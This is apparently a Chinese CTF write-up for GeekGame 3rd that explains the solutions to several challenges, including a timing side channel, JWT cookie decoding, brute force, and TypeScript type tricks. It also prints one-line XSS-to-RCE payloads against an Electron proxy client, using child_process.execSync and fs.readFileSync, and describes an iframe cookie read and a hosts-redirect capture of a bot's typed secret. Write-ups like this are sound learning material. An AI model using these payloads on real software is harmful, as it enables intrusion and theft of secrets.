+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;y0u_Play_GamE_vErY_WEl1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个感觉很像去年的“智慧检测器”那道题，居然是非预期解吗（</p>
+<h3 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h3><p>然后第二关则需要进入图中的Flag Room。进去执行getflag命令之后，他会让我们猜数：</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob16_2.png"></p>
+<p>实在不知道输什么，我们简单砸个键盘：</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob16_3.png"></p>
+<p>感觉看到了有趣的东西，我们从部分的源代码中可以看出，每次猜数都会取<code>flag_number</code>的最后一位进行操作。那么这个<code>getStrongPrime()</code>又有什么意义呢？我们再手玩一会试试，可以发现有的时候的时候他会马上反应，有时候他会过几秒再输出结果。这个时候我们应该反应过来，<code>getStrongPrime()</code>是一个比较耗时的函数，那么我们可以用此次猜测的耗时来知道<code>flag_number</code>的尾位。</p>
+<p>于是我写了个<code>runner.py</code>，用<code>pwntools</code>和服务器连接，每次猜测并看他是否立刻返回。再把结果记录到文件里。最后flag2就是这个二进制数所对应的ascii字串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;You_s0LVeD_tH1s_chALleNge_excEllENtLy&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="麦恩·库拉夫特"><a href="#麦恩·库拉夫特" class="headerlink" title="麦恩·库拉夫特"></a>麦恩·库拉夫特</h2><blockquote>
+<p>感觉这题不是很友好啊😡😡😡提示除了钻石块以外感觉p用没有，拿个望远镜我还以为是要找什么特殊地形然后弄成地图再来个什么二维码识别什么的（混乱中）（叶子的新歌后遗症），结果两问都是NBTExplorer有点难绷。这红石电路更是个重量级，读不读的出正确的流纯看命是吧。提示放了跟没放一个样。这下真不如O神了😄</p>
+</blockquote>
+<h3 id="flag1-flag2"><a href="#flag1-flag2" class="headerlink" title="flag1 &amp; flag2"></a>flag1 &amp; flag2</h3><p>如上所说，我们只用拿NBTExplorer在存档里搜索<code>minecraft:diamond_block</code>就能找到三个flag所在的位置。（话说为啥这个B东西跑那么慢，解析50M的文件真的要那么久吗<del>还是我电脑太烂了</del>）</p>
+<p>三个flag分别在Chunk(11,9), Chunk(35,-7), Chunk(204,-119)。 </p>
+<p>然后我们找到了flag1和flag2：</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob22_1.png"></p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob22_2.png"></p>
+<p>得到了两个flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Exp0rIng_M1necRaft_i5_Fun&#125;</span><br><span class="line">flag&#123;pAR3inG_ANvI1_iSeAaasY2&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag3-failed"><a href="#flag3-failed" class="headerlink" title="flag3(failed)"></a>flag3(failed)</h3><p>然后又是批判红石电路环节。第三问是有一个红石电路实现的硬盘，会以2.5Byte&#x2F;s的速度向外输出用红石强度0~15表示的信号。因为数据量有2KB，手读是过于痛苦的，我的想法是定时侦测红石状态并输出到命令行，再将命令行输出转化为数据。定时侦测并输出就成为了问题的关键。我尝试了以下操作：</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob22_3.png"></p>
+<ul>
+<li>他有一个红石灯显示屏，硬盘的输出会先转化成16条0&#x2F;1信号再传给显示屏，如上图。我们把01信号和命令方块接在一起，用<code>say</code>命令输出即可。但这样无法识别多个1。</li>
+<li>把01信号和活塞相连，然后拿命令方块识别活塞状态。但活塞貌似有延时，这样信号会乱掉。</li>
+<li>将命令方块和4刻的信号发生器连接，每次激活识别方块状态。这样貌似信号也会乱掉。</li>
+<li>把01信号和命令方块相连，命令方块设置成被红石激活时每tick循环执行命令。这样输出的字节流里面理论上来说每5个字符表示一个信号。我们已经可以从输出结果中找到<code>89 50 4e 47 0d 0a 1a 0a </code>和<code>49 45 4e 44 ae 42 60 82</code>这样的<code>PNG</code>文件的特征了，但是大概是由于信号不稳定，每个信号并不是严格对应5个字符，这也可能导致了解出来的二进制流不能对应合法的<code>PNG</code>文件。</li>
+<li>貌似将16进制输出转为01信号并不是一个很同步的操作，那么我们是否可以找到直接监测16进制红石信号的方式呢？我没有找到方法。<code>execute if</code>命令貌似不能获得红石信号大小的信息。想借助外部工具，或者魔改非原版客户端来获得红石方块信息，但是却没能成功。</li>
+</ul>
+<p>在第三小题上我花费了大量的时间，但是却没能成功获得答案。我先respect一下做出来这道题的选手。</p>
+<p>然后冷静下来理性讨论一下，我觉得出题人的本意是好的，用mc出题还是有点意思的。但是可能执行上确实有些问题：第一第二问重合度过高的问题暂且不谈，红石电路这道题确实太玄学了。可能是我缺乏红石电路知识，但是我个人觉得想要获得稳定的信号输出流确实是难以办到而且有一定随机性的事情。这种好像只差临门一脚却又总是随机掉链子的感觉确实太过于折磨了（笑）</p>
+<h2 id="Emoji-Wordle"><a href="#Emoji-Wordle" class="headerlink" title="Emoji Wordle"></a>Emoji Wordle</h2><h3 id="flag2-2"><a href="#flag2-2" class="headerlink" title="flag2"></a>flag2</h3><p>我们可以看到Flag2和Flag3的数据是存在cookie的<code>PLAY_SESSION</code>里的，我们先从flag2入手。</p>
+<p>我们把<code>PLAY_SESSION</code>先做一遍base64(解不出来就尝试去掉尾部几个字符)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#123;&quot;alg&quot;:&quot;HS256&quot;&#125;&#123;&quot;data&quot;:&#123;&quot;level&quot;:&quot;2&quot;,&quot;remaining_guesses&quot;:&quot;8&quot;,&quot;target&quot;:&quot;\\uD83D\\uDC6A\\uD83D\\uDC44\\uD83D\\uDC85\\uD83D\\uDC44\\uD83D\\uDC48\\uD83D\\uDC55\\uD83D\\uDC74\\uD83D\\uDC40\\uD83D\\uDC7B\\uD83D\\uDC43\\uD83D\\uDC5E\\uD83D\\uDC76\\uD83D\\uDC87\\uD83D\\uDC46\\uD83D\\uDC76\\uD83D\\uDC84\\uD83D\\uDC43\\uD83D\\uDC5C\\uD83D\\uDC69\\uD83D\\uDC64\\uD83D\\uDC67\\uD83D\\uDC60\\uD83D\\uDC43\\uD83D\\uDC40\\uD83D\\uDC5C\\uD83D\\uDC7B\\uD83D\\uDC75\\uD83D\\uDC43\\uD83D\\uDC63\\uD83D\\uDC59\\uD83D\\uDC83\\uD83D\\uDC82\\uD83D\\uDC80\\uD83D\\uDC7C\\uD83D\\uDC53\\uD83D\\uDC56\\uD83D\\uDC69\\uD83D\\uDC88\\uD83D\\uDC53\\uD83D\\uDC5F\\uD83D\\uDC49\\uD83D\\uDC44\\uD83D\\uDC69\\uD83D\\uDC3F\\uD83D\\uDC5B\\uD83D\\uDC5E\\uD83D\\uDC7B\\uD83D\\uDC7E\\uD83D\\uDC53\\uD83D\\uDC81\\uD83D\\uDC7A\\uD83D\\uDC74\\uD83D\\uDC40\\uD83D\\uDC79\\uD83D\\uDC8A\\uD83D\\uDC5A\\uD83D\\uDC3F\\uD83D\\uDC48\\uD83D\\uDC67\\uD83D\\uDC48\\uD83D\\uDC41\\uD83D\\uDC66\\uD83D\\uDC6A\\uD83D\\uDC8A&quot;&#125;,&quot;nbf&quot;:1697888294,&quot;iat&quot;:1697888294&#125;\x17\x8a2[o\xac\xe2t q\x8e\xa4\x89\xe1\x87w%\x8a\xee\x08\\\xfbb\xcb\x83\x92[J\x9fr\xda&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>实际上面的东西叫JWT（Json Web Token），最后那一串bytes是密钥。我们可以看到target里面大概就是编码表示的emoji串。我原本是把它放到Firefox控制台里然后删掉重复斜杠并log得到emoji串的，但是写Writeup的时候我才发现可以用<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a>直接解析jwt，我们得到：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;remaining_guesses&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;👪👄💅👄👈👕👴👀👻👃👞👶💇👆👶💄👃👜👩👤👧👠👃👀👜👻👵👃👣👙💃💂💀👼👓👖👩💈👓👟👉👄👩🐿👛👞👻👾👓💁👺👴👀👹💊👚🐿👈👧👈👁👦👪💊&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span> <span class="number">1697888294</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1697888294</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样我们就解出了flag2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d3c0d1n9_jwT_15_345y&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag1-2"><a href="#flag1-2" class="headerlink" title="flag1"></a>flag1</h3><p>然后我们去做flag1。因为序列是不变的所以我们写脚本暴力枚举。</p>
+<p>一开始我不清楚字符集有多大，于是我取了一次placeholder作为字符集进行尝试，如<code>bf.mjs</code>所示。当我试到还剩5个空位的时候我发现推不下去了，大概还有别的字符。此时我必须先弄清楚可行的字符集是什么。我在脚本的开头先不断获取页面，将placeholder加入字符集，然后发现加到128个时字符集大小不再变化。我们合理猜想字符集大小为128。然后我们再进行枚举就可以猜出整个序列，如<code>five.mjs</code>所示。</p>
+<p>序列和flag分别为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">💈💅👼💁👦👗💊💊👱👇👔💆👺👦👓👳👔👉👞💄👧👘💃👺👸👴👿👙👵💆👩👽👛👓👦👝👢💃💅👶👅💈👈💅👼👁👃💂👆👄👂👳👲👢💆👤👜👆👺👱👺👛👆👡</span><br><span class="line">flag&#123;s1Mp1e_brut3f0rc3&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag3-failed-1"><a href="#flag3-failed-1" class="headerlink" title="flag3(failed)"></a>flag3(failed)</h3><p>实在是没有整出来。这次的token里面有个seed。因为服务器是没有状态的，那么我猜我每次只要重新生成对应的jwt就能一直尝试下去。但是好像每次生成出来的结果不一样，可行字符集越来越少最后直接没了，玉玉了。</p>
+<h2 id="第三新XSS"><a href="#第三新XSS" class="headerlink" title="第三新XSS"></a>第三新XSS</h2><h3 id="flag1-3"><a href="#flag1-3" class="headerlink" title="flag1"></a>flag1</h3><p>给了提示之后终于找到了正确的参考文档，<del>为什么之前就搜不到呢？搜索技巧卡在这里了😡</del> <del>小北一血是这样的</del></p>
+<p>我们只要搞个&lt;iframe&gt;然后访问他的<code>contentDocument.cookie</code>就行了。但是试了好几次都没有输出结果。为什么啊？哦原来是script执行的时候iframe还没加载出网页导致的。我们整个<code>setTimeout</code>让他延时设置标题就好了。代码如<code>payload1.html</code>所示，flag如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;TotALlY-nO-sECuRItY-In-the-sAme-oRIgiN&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag2-failed"><a href="#flag2-failed" class="headerlink" title="flag2(failed)"></a>flag2(failed)</h3><p>看了ServiceWorker但是没搭成功，一直报DomError，于是就放弃了。</p>
+<h2 id="简单的打字稿"><a href="#简单的打字稿" class="headerlink" title="简单的打字稿"></a>简单的打字稿</h2><blockquote>
+<p>这为啥不是misc题啊🤡这怎么看都是个misc吧🤡总不会是沾了Typescript就叫Web题了吧</p>
+</blockquote>
+<h3 id="flag1-4"><a href="#flag1-4" class="headerlink" title="flag1"></a>flag1</h3><p>Typescript真的纯纯不会，类型推导完全写不来，只能进行一些搜索引擎的搜。</p>
+<p>先是参考了两个比较好的教程：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/452657140">https://zhuanlan.zhihu.com/p/452657140</a>和<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2287845">https://cloud.tencent.com/developer/article/2287845</a>，在里面找到了如下类型：</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">StartWith</span>&lt;<span class="title class_">Str</span> <span class="keyword">extends</span> <span class="built_in">string</span>, <span class="title class_">Prefix</span> <span class="keyword">extends</span> <span class="built_in">string</span>&gt; = <span class="title class_">Str</span> <span class="keyword">extends</span> <span class="string">`<span class="subst">$&#123;Prefix&#125;</span><span class="subst">$&#123;infer Rest&#125;</span>`</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
+
+<p>用来判断一个字面量是否是另一个字面量的前缀，然后我脑子一抽，想到了如下b操作：</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">StartWith</span>&lt;<span class="title class_">Str</span> <span class="keyword">extends</span> <span class="built_in">string</span>, <span class="title class_">Prefix</span> <span class="keyword">extends</span> <span class="built_in">string</span>&gt; = <span class="title class_">Str</span> <span class="keyword">extends</span> <span class="string">`<span class="subst">$&#123;Prefix&#125;</span><span class="subst">$&#123;infer Rest&#125;</span>`</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Checker</span>&lt;<span class="title class_">Prefix</span> <span class="keyword">extends</span> <span class="built_in">string</span>&gt; = <span class="title class_">StartWith</span>&lt;flag1, <span class="title class_">Prefix</span>&gt;;</span><br><span class="line"><span class="keyword">const</span> a : <span class="title class_">Checker</span>&lt;‘flag&#123;xxx’&gt; = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本没报错等价于<code>flag&#123;xxx</code>是flag的前缀，那么我们就从<code>flag&#123;</code>开始，不断枚举下一个字符是否正确😆。如脚本<code>baole.mjs</code>所示。得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;tOo0_e4sY_f1ag_foR_tooo_Easy&#125;</span><br></pre></td></tr></table></figure>
+
+<p>(Easy后面可能还有一个单词，当时试完是凌晨7点，<del>人都要飞起来了导致的</del>忘记保存了，但反正Easy前面都是对的)</p>
+<h3 id="flag2-3"><a href="#flag2-3" class="headerlink" title="flag2"></a>flag2</h3><p>噔 噔 咚</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> flag2 = <span class="built_in">object</span> | (<span class="keyword">new</span> () =&gt; &#123;</span><br><span class="line">    <span class="attr">v</span>: <span class="function">() =&gt;</span> <span class="function">(<span class="params">a: (a: <span class="built_in">unknown</span>, b: &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&#x27;flag&#123;xxx&#125;&#x27;</span>: <span class="built_in">never</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    &#125; &amp; Record&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;) =&gt; <span class="built_in">never</span></span>) =&gt;</span> <span class="built_in">unknown</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>上面是我们的flag2，我们第一个目标是从类型<code>flag2</code>中提取出关键的字面量。</p>
+<p>感觉有点像剥洋葱一样，一点一点从外往里剥。只能狠狠的拷打new bing来维持生活这个样子:</p>
+<ol>
+<li>先去掉object。因为右边的类型也属于object我们不能直接把object剥离，但我们可以取其函数返回值，此时左边为never，取并之后就只剩右边了。然后我们顺便把返回值的v属性值给取出来。</li>
+</ol>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ConstructorReturnType</span>&lt;T&gt; = T <span class="keyword">extends</span> <span class="keyword">new</span> () =&gt; infer R ? R : <span class="built_in">never</span></span><br><span class="line"><span class="keyword">type</span> t1 = <span class="title class_">ConstructorReturnType</span>&lt;flag2&gt;[<span class="string">&#x27;v&#x27;</span>]; <span class="comment">// () =&gt; (a: (a: ..., b: ...) =&gt; never) =&gt; unknown</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>取出外层的返回值，然后再取出内层的参数，其中第二个就是b对应的类型。</li>
+</ol>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ExtractInner</span>&lt;T&gt; = T <span class="keyword">extends</span> () =&gt; <span class="function">(<span class="params">arg: infer P</span>) =&gt;</span> <span class="built_in">unknown</span> ? P : <span class="built_in">never</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">FunctionParameters</span>&lt;T&gt; = T <span class="keyword">extends</span> (...<span class="attr">args</span>: infer P) =&gt; <span class="built_in">any</span> ? P : <span class="built_in">never</span>;</span><br><span class="line"><span class="keyword">type</span> t2 = <span class="title class_">FunctionParameters</span>&lt;<span class="title class_">ExtractInner</span>&lt;t1&gt;&gt;[<span class="number">1</span>]; <span class="comment">// &#123;&#x27;flag&#123;xxx&#125;&#x27; : never&#125; &amp; Record&lt;string, string&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>去掉右边的<code>Record</code>。尝试的最久的一个地方。因为这就相当于替换掉一个key对应value类型，其他不变的一个record，用一般的mapped type + keyof的方案貌似不能取出flag。在<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/51465182/how-to-remove-index-signature-using-mapped-types">https://stackoverflow.com/questions/51465182/how-to-remove-index-signature-using-mapped-types</a>，我找到了我需要的方法：</li>
+</ol>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">NeverKeys</span>&lt;T, R&gt; = &#123; [K <span class="keyword">in</span> keyof T]: T[K] <span class="keyword">extends</span> <span class="built_in">never</span> ? <span class="built_in">string</span> : R &#125;;</span><br><span class="line"><span class="keyword">type</span> t3 = <span class="title class_">NeverKeys</span>&lt;t2, <span class="built_in">never</span>&gt;; <span class="comment">// &#123;[x: string]: never, &#x27;flag&#123;xxx&#125;&#x27;: string&#125;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">RemoveIndex</span>&lt;T&gt; = &#123; [ K <span class="keyword">in</span> keyof T <span class="keyword">as</span> <span class="built_in">string</span> <span class="keyword">extends</span> K ? <span class="built_in">never</span> : <span class="built_in">number</span> <span class="keyword">extends</span> K ? <span class="built_in">never</span> : <span class="built_in">symbol</span> <span class="keyword">extends</span> K ? <span class="built_in">never</span> : K] : T[K];&#125;; <span class="comment">// !!! Important</span></span><br><span class="line"><span class="keyword">type</span> temp = keyof <span class="title class_">RemoveIndex</span>&lt;b1&gt;; <span class="comment">// &#x27;flag&#123;xxx&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>于是我们得到了字面量，此时我想用类型推导的方式去掉前面的flag前缀防止被申鹤，然后在报错信息中读flag的内容，但不知道为啥失败了，于是我只能还是采用枚举前缀的方式，如<code>kaida.mjs</code>所示。得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Ts_fLaG_bETteR_tHAn_PytH0n&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>感觉是个不怎么带脑子的暴力非预期()</p>
+</blockquote>
+<h2 id="非法所得"><a href="#非法所得" class="headerlink" title="非法所得"></a>非法所得</h2><p>按照做题顺序排列一下。</p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>看到Github Issue感觉会了，漏洞在于他是Electron框架，然后软件不加转义的把属性值给贴到页面上，页面直接把他当html解析了。所以我们只要在属性里面包含一个&lt;img&gt;标签，给他一个不可用的src，再在onerror事件里插入恶意代码，这个代码就会在这个页面显示的时候被执行。</p>
+<p>然后我们把构造好的Payload yaml放到任意的pastebin网站上，把raw text链接喂给Import就可以了。</p>
+<p>但是直接抄了里面的Payload结果P用没有，怎么卡在这里了呢？想了一下，或许是一些引号转义在不同平台上表现不同，但感觉至少直接解析img标签的漏洞应该是不随平台变化而变化的。那我就不断尝试在onerror里面加东西，然后发现把onerror改成：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">alt</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;/app/readflag&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure>
+
+<p>时，是能让标签显示<code>readflag</code>的执行结果的，如下图：</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob02_1.png"></p>
+<h3 id="flag1-5"><a href="#flag1-5" class="headerlink" title="flag1"></a>flag1</h3><p>我一开始想的是，或许有什么路径穿越的操作，可以让Import处获得<code>flag.yml</code>的链接。结果看完RCE的漏洞之后，我发现直接用这个漏洞读<code>/app/profiles/flag.yml</code>再显示在标签里就好了，payload如下(因为显示不下整个文件所以截一个子串)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.alt=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/profiles/flag.yml&#x27;,&#x27;utf8&#x27;).substr(85,40)</span><br></pre></td></tr></table></figure>
+
+<p>结果如下图：</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob02_2.png"></p>
+<p>（这不会也是非预期吧</p>
+<h3 id="flag2-4"><a href="#flag2-4" class="headerlink" title="flag2"></a>flag2</h3><p>看源代码可以知道，visit操作在访问的host为<code>ys.pku.edu.cn</code>时，会在页面的id为<code>primogem_code</code>的密码输入框中输入flag。那么我们的任务有两个：1. 将host为<code>ys.pku.edu.cn</code>的请求导到某个我们控制的页面 2. 搭建一个能被容器访问到的网页服务</p>
+<p>对于第一点，我搜到了cfw配置文件的hosts字段，hosts字段可以用来定义域名到IP地址的映射。</p>
+<p>那么我们就要搭建一个有固定ip的http服务器，原本我想用github pages，但是他没有固定ip。然后我想到这个环境应该是搭在校内的，所以直接在本机上跑<code>python HTTPServer</code>好像也没啥问题。</p>
+<p>最后设计页面的时候，因为不能直接看到密码输入框的内容，同时吸取之前<code>xssbot</code>那题的经验，我们设个定时器，定时将文本框内容复制到旁边的div里，于是我们得到了下图：</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob02_3.png"></p>
+<p>三个flag分别为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C1aShC0r3IsUNs3cuRE&#125;</span><br><span class="line">flag&#123;badPr0xyCaus3sBAD0utcoM3&#125;</span><br><span class="line">flag&#123;UnS3curEP0weRedBye1ectron&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>看了一下pastebin，解这个题提交了30+个payload，令人感叹。</p>
+</blockquote>
+<h2 id="汉化绿色版免费下载"><a href="#汉化绿色版免费下载" class="headerlink" title="汉化绿色版免费下载"></a>汉化绿色版免费下载</h2><h3 id="flag1-6"><a href="#flag1-6" class="headerlink" title="flag1"></a>flag1</h3><p>查了一下这个.xp3的后缀，貌似是一个kirikiri的Galgame引擎的数据文件。原本我想用xp3viewer去解包，但是不管是Windows 10还是Ubuntu + Wine貌似都run不了的样子。自暴自弃的我用Binwalk尝试看了一下，然后发现.xp3可以解出好多东西，感觉像是把文本和程序和图片文件还有一些奇奇怪怪的文件打包起来的一个包。</p>
+<p><img src="https://raw.githubusercontent.com/GCC314/geekgame-3rd-writeup/main/img/prob25_1.png"></p>
+<p><del>反正搞不出xp3viewer不如我随便</del> <code>binwalk -e</code>梭哈一把，先看看里面的文本文件。</p>
+<p><code>_data.xp3.extracted/</code>目录下比较重要的文本有<code>244AC9</code>,<code>244C57</code>,<code>15956</code>,<code>244822</code>,<code>244964</code>这五个，分别看着就像游戏在某一个页面的脚本。</p>
+<p>其中<code>244822</code>中的内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*done|结束</span><br><span class="line"></span><br><span class="line">@if exp=&quot;f.hash == f.prev_hash&quot;</span><br><span class="line"></span><br><span class="line">@bg storage=&quot;66ccff&quot;</span><br><span class="line">输入正确！大概。[l][r]</span><br><span class="line">感谢配合，Flag 1 是：[font color=&quot;0x66ccff&quot; size=0]flag&#123;did-you-unpack-the-xp3?&#125;[resetfont]。[l][r]</span><br><span class="line">Flag 2 是出题人在存档里输入的内容。[l][r]</span><br><span class="line"></span><br><span class="line">@else</span><br><span class="line"></span><br><span class="line">... ...</span><br></pre></td></tr></table></figure>
+
+<p>这个应该是输入结束的结算界面，我们找到了flag1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;did-you-unpack-the-xp3?</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是<code>@if exp=&quot;f.hash == f.prev_hash&quot;</code>这句，猜测的结果是通过hash值比较得到的，<del>该不会是字符串hash吧</del>（<del>还真是</del>），为第二问做出铺垫()</p>
+<h3 id="flag2-5"><a href="#flag2-5" class="headerlink" title="flag2"></a>flag2</h3><p>那我们现在观察另一个文件<code>244AC9</code>，这是第一次输入的页面脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">@eval exp=&quot;f.text = &#x27;flag&#123;&#x27;&quot;</span><br><span class="line">@eval exp=&quot;f.hash = 1337&quot;</span><br><span class="line"></span><br><span class="line">*round_1|输入第一遍</span><br><span class="line"></span><br><span class="line">首先输入第一遍。[p]</span><br><span class="line"></span><br><span class="line">*sel_loop|第一次输入</span><br><span class="line"></span><br><span class="line">@jump storage=&quot;round2.ks&quot; cond=&quot;f.text.charAt(f.text.length-1)==&#x27;&#125;&#x27;&quot;</span><br><span class="line"></span><br><span class="line">当前文本：[emb exp=&quot;f.text&quot;][r]</span><br><span class="line"></span><br><span class="line">[link target=*sel_a clickse=&quot;SE_306&quot;]&gt; 输入 A[endlink][r]</span><br><span class="line">[link target=*sel_e clickse=&quot;SE_306&quot;]&gt; 输入 E[endlink][r]</span><br><span class="line">... ...</span><br><span class="line">[s]</span><br><span class="line"></span><br><span class="line">*sel_a</span><br><span class="line">@eval exp=&quot;f.text = f.text + &#x27;A&#x27;&quot;</span><br><span class="line">@eval exp=&quot;f.hash = f.hash * 13337 + 11&quot;</span><br><span class="line">@jump target=*sel_end</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">*sel_end</span><br><span class="line">@eval exp=&quot;f.hash = f.hash % 19260817&quot;</span><br><span class="line"></span><br><span class="line">输入完成！[p]</span><br><span class="line">@jump target=*sel_loop</span><br></pre></td></tr></table></figure>
+
